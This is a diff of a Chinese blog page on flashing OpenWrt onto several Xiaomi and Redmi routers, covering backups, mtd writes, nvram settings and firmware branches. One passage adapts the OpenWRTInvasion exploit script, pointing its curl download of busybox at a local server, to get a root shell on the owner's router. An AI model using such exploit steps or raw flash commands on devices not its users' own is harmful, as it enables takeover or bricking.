 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Enable uart and boot_wait, useful for testing or recovery if you have an uart adapter!</span></span><br><span class="line">nvram <span class="built_in">set</span> uart_en=1</span><br><span class="line">nvram <span class="built_in">set</span> boot_wait=on</span><br><span class="line">nvram <span class="built_in">set</span> bootdelay=5</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set kernel1 as the booting kernel</span></span><br><span class="line">nvram <span class="built_in">set</span> flag_try_sys1_failed=1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Commit our nvram changes</span></span><br><span class="line">nvram commit</span><br></pre></td></tr></table></figure>
@@ -272,62 +476,72 @@
 <p>不过也可以自行修改代码：修改<code>script.sh</code>，将其中的链接替换成本地链接。可以使用python -m http.server运行一个小的http服务，提供下载。例：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -L <span class="string">"https://github.com/acecilia/OpenWRTInvasion/raw/master/script_tools/busybox-mipsel"</span> --insecure --output busybox</span><br><span class="line"></span><br><span class="line"><span class="comment">#改为,ip需要调整</span></span><br><span class="line">curl <span class="string">"http://192.168.31.189:8000/busybox-mipsel"</span> --output busybox</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>参考仓库README，成功获得shell后，如图所示。接着上传镜像（initramfs-kernel.bin和squashfs-sysupgrade.bin都可以，推荐使用后者），然后运行mtd write（用cat /proc/mtd查看有哪些分区）<br><img src="/images/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/image-20211013203806985.png" alt="image-20211013203806985"><br><img src="/images/2022-02-13-openwrt%E5%88%B7%E6%9C%BA/image-20211013234425902.png" alt="image-20211013234425902"></p>
+<li><p>参考仓库README，成功获得shell后，如图所示。接着上传镜像（initramfs-kernel.bin和squashfs-sysupgrade.bin都可以，推荐使用后者），然后运行mtd write（用cat /proc/mtd查看有哪些分区）<br><img src="https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20221030210955796.png" alt="image-20221030210955796"></p>
 </li>
 <li><p>最后等待路由器重启完成即可。</p>
 </li>
 </ol>
 <h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>breed使用说明：<a href="https://www.sohu.com/a/304140654_120096961" target="_blank" rel="noopener">https://www.sohu.com/a/304140654_120096961</a></p>
 <p>breed刷openwrt教程<a href="https://www.ixigua.com/6974624328725824031" target="_blank" rel="noopener">https://www.ixigua.com/6974624328725824031</a></p>
-<h3 id="MI-R3G"><a href="#MI-R3G" class="headerlink" title="MI R3G"></a>MI R3G</h3><ol>
-<li><p>获取ssh</p>
+<h3 id="MI-R3G"><a href="#MI-R3G" class="headerlink" title="MI R3G"></a>MI R3G</h3><p>官方教程：<a href="https://openwrt.org/toh/xiaomi/mir3g" target="_blank" rel="noopener">[OpenWrt Wiki] Xiaomi Mi WiFi R3G (Mi Wifi Router 3G / MIR3G / MI3G / R4A Gigabit)</a></p>
+<p>r3g官方固件下载：<a href="https://firmware-selector.openwrt.org/?version=21.02.3&target=ramips%2Fmt7621&id=xiaomi_mi-router-3g">OpenWrt Firmware Selector</a></p>
+<h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><ul>
+<li>FAT32格式U盘</li>
+<li>一枚针用于戳路由器reset键</li>
+<li>手机安装MIWIFI app</li>
+</ul>
+<h4 id="开启ssh"><a href="#开启ssh" class="headerlink" title="开启ssh"></a>开启ssh</h4><ol>
+<li><p>更新为小米开发版固件：<a href="https://bigota.miwifi.com/xiaoqiang/rom/r3g/miwifi_r3g_firmware_12f97_2.25.124.bin" target="_blank" rel="noopener">https://bigota.miwifi.com/xiaoqiang/rom/r3g/miwifi_r3g_firmware_12f97_2.25.124.bin</a></p>
+</li>
+<li><p><strong>下载小米路由器手机客户端(应用商店MI WIFI)软件，绑定路由器</strong></p>
+</li>
+<li><p>根据<a href="https://d.miwifi.com/rom/ssh，开启SSH" target="_blank" rel="noopener">https://d.miwifi.com/rom/ssh，开启SSH</a></p>
+<p><em>p.s. 1. 即使是同一型号，miwifi_ssh.bin也是不同的；2. ssh密码显示在该页面</em></p>
 <ol>
-<li>更新为小米开发版固件</li>
-<li><strong>下载小米路由器手机客户端软件，绑定路由器</strong></li>
-<li>根据<a href="https://d.miwifi.com/rom/ssh，开启SSH" target="_blank" rel="noopener">https://d.miwifi.com/rom/ssh，开启SSH</a></li>
+<li>请将下载的工具包bin文件复制到U盘（FAT/FAT32格式）的根目录下，保证文件名为miwifi_ssh.bin；</li>
+<li>断开小米路由器的电源，将U盘插入USB接口；</li>
+<li>按住reset按钮之后重新接入电源，指示灯变为黄色闪烁状态即可松开reset键；</li>
+<li>等待3-5秒后安装完成之后，小米路由器会自动重启，之后您就可以尽情折腾啦 ：）</li>
 </ol>
 </li>
-<li><p>先通过cat /dev/mtdxx手动备份了一下闪存，值得注意的是，因为这次flash有128MB。因此就算是在挂载在内存的tmp分区上，空间也不够。不过由于可以插U盘，因此可以直接写到U盘中！！！</p>
-</li>
-<li><p>还是刷了一下breed，备份了一下EEPROM。不过发现刷了breed后，刷openwrt反而变得复杂了，没办法直接刷。不过刷pandavn和老毛子固件倒是很简单。这里有解释，以及一个workaround。</p>
-<p>但是考虑到，这样flash分区就不知道会变得怎样了。因此还是决定采用openwrt官方的方法刷。</p>
-</li>
-<li><p>因此需要从breed恢复小米官方固件</p>
+</ol>
+<h4 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h4><p>查看mtd分区</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@XiaoQiang:~# cat &#x2F;proc&#x2F;mtd</span><br><span class="line">dev:    size   erasesize  name</span><br><span class="line">mtd0: 07f80000 00020000 &quot;ALL&quot;</span><br><span class="line">mtd1: 00080000 00020000 &quot;Bootloader&quot;</span><br><span class="line">mtd2: 00040000 00020000 &quot;Config&quot;</span><br><span class="line">mtd3: 00040000 00020000 &quot;Bdata&quot;</span><br><span class="line">mtd4: 00040000 00020000 &quot;Factory&quot;</span><br><span class="line">mtd5: 00040000 00020000 &quot;crash&quot;</span><br><span class="line">mtd6: 00040000 00020000 &quot;crash_syslog&quot;</span><br><span class="line">mtd7: 00040000 00020000 &quot;reserved0&quot;</span><br><span class="line">mtd8: 00400000 00020000 &quot;kernel0&quot;</span><br><span class="line">mtd9: 00400000 00020000 &quot;kernel1&quot;</span><br><span class="line">mtd10: 02000000 00020000 &quot;rootfs0&quot;</span><br><span class="line">mtd11: 02000000 00020000 &quot;rootfs1&quot;</span><br><span class="line">mtd12: 03580000 00020000 &quot;overlay&quot;</span><br><span class="line">mtd13: 012a6000 0001f000 &quot;ubi_rootfs&quot;</span><br><span class="line">mtd14: 030ec000 0001f000 &quot;data&quot;</span><br></pre></td></tr></table></figure>
+
+<p>备份factory分区</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;dev&#x2F;mtd4 &gt; &#x2F;tmp&#x2F;factory.bin</span><br><span class="line"></span><br><span class="line">#on windows</span><br><span class="line">scp root@192.168.33.193:&#x2F;tmp&#x2F;factory.bin .</span><br><span class="line">scp root@192.168.33.228:&#x2F;tmp&#x2F;factory.bin .</span><br></pre></td></tr></table></figure>
+
+<h4 id="刷openwrt"><a href="#刷openwrt" class="headerlink" title="刷openwrt"></a>刷openwrt</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mtd write openwrt-18.06.2-ramips-mt7621-mir3g-squashfs-kernel1.bin kernel1</span><br><span class="line">mtd write openwrt-18.06.2-ramips-mt7621-mir3g-squashfs-rootfs0.bin rootfs0</span><br><span class="line">nvram set flag_try_sys1_failed&#x3D;1</span><br><span class="line">nvram commit</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
+
+<h3 id="AX6S"><a href="#AX6S" class="headerlink" title="AX6S"></a>AX6S</h3><p>AX6S为国内版，国外版称为AX3200</p>
 <ul>
-<li>刚开始直接在固件那上传了小米官方固件（开发版），但是重启后，显示粉色的灯，无法进入系统。</li>
-<li>搜索后找到了正确方法：<ul>
-<li>进入breed后，恢复小米官方Bootloader</li>
-<li>删除设置的环境变量</li>
-<li>刷入小米官方固件（还是用了开发版）</li>
+<li>SoC：<strong>MT7622</strong>B: 2 x <a href="mailto:A53@1.35GHz">A53@1.35GHz</a> CPU。<ul>
+<li>满血版本是MT7622A，少了蓝牙就是MT7622BV，没有蓝牙和多媒体功能的是MT7622B，基本剩下无线功能的是MT7622E</li>
 </ul>
 </li>
+<li>ram: 256 + flash: 128</li>
+<li><a href="https://openwrt.org/toh/xiaomi/ax3200" target="_blank" rel="noopener">[OpenWrt Wiki] Xiaomi AX3200 / Redmi AX6S</a></li>
 </ul>
-<p>刷完后，发现一切都是刷breed之前的配置。</p>
-</li>
-<li><p>因为恢复后仍然有ssh，所以直接按照openwrt官方方法刷入openwrt，成功</p>
-</li>
-</ol>
-<h3 id="小米路由器救砖"><a href="#小米路由器救砖" class="headerlink" title="小米路由器救砖"></a>小米路由器救砖</h3><h4 id="有官方bootloader的情况"><a href="#有官方bootloader的情况" class="headerlink" title="有官方bootloader的情况"></a>有官方bootloader的情况</h4><p><strong>说明：</strong></p>
-<p>官方的引导程序使用的是uboot，位于flash的Bootloader分区，而官方固件则位于OS1分区。正常刷openwrt的过程中不会修改bootloader。只要还保留着官方bootloader，就可以通过官方修复工具恢复。</p>
-<p><strong>步骤：</strong></p>
-<ol>
-<li>下载<code>小米路由器修复工具</code>和官方镜像：<a href="https://www.xiaomi.cn/post/19184644" target="_blank" rel="noopener">【下载汇总】客户端/ROM下载 - 小米社区 (xiaomi.cn)</a></li>
-<li><strong>路由器通电</strong>，PC通过网线连接到路由器LAN口</li>
-<li>打开<code>MIWIFIRepairTool.x86.exe</code></li>
-<li>选择镜像</li>
-<li><strong>选择网卡</strong>（可以在网络中心中将其它网卡禁用）</li>
-<li>断开路由器电源，按住rst键（也有可能需要用针戳），然后接上电源，等待黄灯闪烁（两个灯，一个是有电源标志，一个有互联网标志，这里为电源灯那个）</li>
-<li>软件自动上传镜像</li>
-<li>保持耐心等待路由器黄灯变蓝（中间过程保持黄灯），<strong>亲测需要4分钟</strong></li>
-<li>断电后重新接上电源，路由器重启</li>
-</ol>
-<h4 id="breed"><a href="#breed" class="headerlink" title="breed"></a>breed</h4><p><strong>说明：</strong></p>
-<p>breed自身便是一个bootloader，刷完breed后会覆盖原本的bootloader。如果想复原，可通过breed的功能，重新刷回官方bootloader。<strong>强烈建议刷breed前，先备份原本的bootloader以及整个flash</strong>。如果没备份，这里是恩山上收集的<strong>小米官方bootloader下载</strong>：<a href="https://www.right.com.cn/forum/thread-4102208-1-1.html" target="_blank" rel="noopener">论坛收集的几个小米路由器官方bootloader - 恩山无线论坛</a></p>
-<p><strong>步骤：</strong></p>
-<ol>
-<li>通过breed刷回官方bootloader</li>
-<li>通过官方修复工具修复</li>
-</ol>
+<h4 id="openwrt-git分支"><a href="#openwrt-git分支" class="headerlink" title="openwrt git分支"></a>openwrt git分支</h4><p>图中蓝色为master分支，绿色为21.02稳定版分支，橙色为LEDE19.07分支，而粉色的为新的22.03测试版分支。可以看到AX6S最早在master分支中得到支持，然后不久便在22.03中得到了添加。</p>
+<ul>
+<li>好奇为何不使用merge</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20220802134158765.png" alt="image-20220802134158765"></p>
+<p>21.02稳定版分支，当初也是从master分支中分离出来的</p>
+<p><img src="https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20220802134945115.png" alt="image-20220802134945115"></p>
+<h5 id="immortal-wrt"><a href="#immortal-wrt" class="headerlink" title="immortal wrt"></a>immortal wrt</h5><ul>
+<li><a href="https://github.com/immortalwrt/immortalwrt" target="_blank" rel="noopener">immortalwrt/immortalwrt: An opensource OpenWrt variant for mainland China users. (github.com)</a></li>
+</ul>
+<p>有以下这些分支。开发流程为将官方分支合并到自己的分支。但是21.02稳定版仍然没有AX6S的支持，网上看到的是18.06-k5.4分支的</p>
+<ul>
+<li><a href="https://www.right.com.cn/forum/forum.php?mod=viewthread&tid=8187405" target="_blank" rel="noopener">AX6S 闭源无线驱动Openwrt 刷机教程/固件下载-小米无线路由器以及小米无线相关的设备-恩山无线论坛 (right.com.cn)</a></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* openwrt-21.02</span><br><span class="line">  remotes&#x2F;origin&#x2F;HEAD -&gt; origin&#x2F;openwrt-21.02</span><br><span class="line">  remotes&#x2F;origin&#x2F;master</span><br><span class="line">  remotes&#x2F;origin&#x2F;openwrt-18.06</span><br><span class="line">  remotes&#x2F;origin&#x2F;openwrt-18.06-k5.4</span><br><span class="line">  remotes&#x2F;origin&#x2F;openwrt-21.02</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/TheRainstorm/.image-bed/main/picgo/image-20220802142756560.png" alt="image-20220802142756560"></p>
+<h3 id="竞斗云2-0"><a href="#竞斗云2-0" class="headerlink" title="竞斗云2.0"></a>竞斗云2.0</h3><p>需要先刷入opboot（一个第三方bootloader）<a href="https://www.red-yellow.net/竞斗云2刷opboot.html" target="_blank" rel="noopener">竞斗云2刷opboot - 路由智态 (red-yellow.net)</a></p>
+<p>然后再刷openwrt。</p>
+<p>比较担心opboot和opewrt最新版的兼容性。</p>
 
     </div>
 
@@ -339,6 +553,7 @@
           <div class="post-tags">
               <a href="/tags/%E6%8A%98%E8%85%BE/" rel="tag"># 折腾</a>
               <a href="/tags/%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/" rel="tag"># 如何实现网络自由</a>
+              <a href="/tags/openwrt/" rel="tag"># openwrt</a>
           </div>
 
         
@@ -413,7 +628,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#刷机记录"><span class="nav-number">1.</span> <span class="nav-text">刷机记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#刷机方法总结"><span class="nav-number">2.</span> <span class="nav-text">刷机方法总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Redmi-AC2100刷Openwrt"><span class="nav-number">2.1.</span> <span class="nav-text">Redmi AC2100刷Openwrt</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-确认stock系统版本"><span class="nav-number">2.1.1.</span> <span class="nav-text">1. 确认stock系统版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-获得ssh"><span class="nav-number">2.1.2.</span> <span class="nav-text">2. 获得ssh</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-下载openwrt镜像"><span class="nav-number">2.1.3.</span> <span class="nav-text">3. 下载openwrt镜像</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-备份"><span class="nav-number">2.1.4.</span> <span class="nav-text">4. 备份</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-设置环境变量"><span class="nav-number">2.1.5.</span> <span class="nav-text">5. 设置环境变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-刷机"><span class="nav-number">2.1.6.</span> <span class="nav-text">6. 刷机</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MI-4A千兆版"><span class="nav-number">2.2.</span> <span class="nav-text">MI 4A千兆版</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#说明"><span class="nav-number">2.2.1.</span> <span class="nav-text">说明</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#步骤"><span class="nav-number">2.2.2.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考"><span class="nav-number">2.2.3.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MI-R3G"><span class="nav-number">2.3.</span> <span class="nav-text">MI R3G</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小米路由器救砖"><span class="nav-number">2.4.</span> <span class="nav-text">小米路由器救砖</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#有官方bootloader的情况"><span class="nav-number">2.4.1.</span> <span class="nav-text">有官方bootloader的情况</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#breed"><span class="nav-number">2.4.2.</span> <span class="nav-text">breed</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Openwrt硬件选择"><span class="nav-number">1.</span> <span class="nav-text">Openwrt硬件选择</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#小米路由器型号总结"><span class="nav-number">1.1.</span> <span class="nav-text">小米路由器型号总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CPU分类"><span class="nav-number">1.1.1.</span> <span class="nav-text">CPU分类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#小米系列产品"><span class="nav-number">1.1.2.</span> <span class="nav-text">小米系列产品</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CPU对比"><span class="nav-number">1.2.</span> <span class="nav-text">CPU对比</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#刷机过程总结"><span class="nav-number">2.</span> <span class="nav-text">刷机过程总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小米路由器救砖"><span class="nav-number">3.</span> <span class="nav-text">小米路由器救砖</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#有官方bootloader的情况"><span class="nav-number">3.1.</span> <span class="nav-text">有官方bootloader的情况</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#刷了breed"><span class="nav-number">3.2.</span> <span class="nav-text">刷了breed</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用操作"><span class="nav-number">4.</span> <span class="nav-text">常用操作</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#snapshot的说明"><span class="nav-number">4.1.</span> <span class="nav-text">snapshot的说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令行安装sysupgrade-bin"><span class="nav-number">4.2.</span> <span class="nav-text">命令行安装sysupgrade.bin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#备份恢复-CLI"><span class="nav-number">4.3.</span> <span class="nav-text">备份恢复 CLI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#性能测试"><span class="nav-number">4.4.</span> <span class="nav-text">性能测试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#iperf3"><span class="nav-number">4.4.1.</span> <span class="nav-text">iperf3</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#具体型号刷机过程"><span class="nav-number">5.</span> <span class="nav-text">具体型号刷机过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Redmi-AC2100刷Openwrt"><span class="nav-number">5.1.</span> <span class="nav-text">Redmi AC2100刷Openwrt</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-确认stock系统版本"><span class="nav-number">5.1.1.</span> <span class="nav-text">1. 确认stock系统版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-获得ssh"><span class="nav-number">5.1.2.</span> <span class="nav-text">2. 获得ssh</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-下载openwrt镜像"><span class="nav-number">5.1.3.</span> <span class="nav-text">3. 下载openwrt镜像</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-备份"><span class="nav-number">5.1.4.</span> <span class="nav-text">4. 备份</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-设置环境变量"><span class="nav-number">5.1.5.</span> <span class="nav-text">5. 设置环境变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-刷机"><span class="nav-number">5.1.6.</span> <span class="nav-text">6. 刷机</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MI-4A千兆版"><span class="nav-number">5.2.</span> <span class="nav-text">MI 4A千兆版</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#说明"><span class="nav-number">5.2.1.</span> <span class="nav-text">说明</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#步骤"><span class="nav-number">5.2.2.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考"><span class="nav-number">5.2.3.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MI-R3G"><span class="nav-number">5.3.</span> <span class="nav-text">MI R3G</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#准备"><span class="nav-number">5.3.1.</span> <span class="nav-text">准备</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#开启ssh"><span class="nav-number">5.3.2.</span> <span class="nav-text">开启ssh</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#备份"><span class="nav-number">5.3.3.</span> <span class="nav-text">备份</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#刷openwrt"><span class="nav-number">5.3.4.</span> <span class="nav-text">刷openwrt</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AX6S"><span class="nav-number">5.4.</span> <span class="nav-text">AX6S</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#openwrt-git分支"><span class="nav-number">5.4.1.</span> <span class="nav-text">openwrt git分支</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#immortal-wrt"><span class="nav-number">5.4.1.1.</span> <span class="nav-text">immortal wrt</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#竞斗云2-0"><span class="nav-number">5.5.</span> <span class="nav-text">竞斗云2.0</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -436,7 +651,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
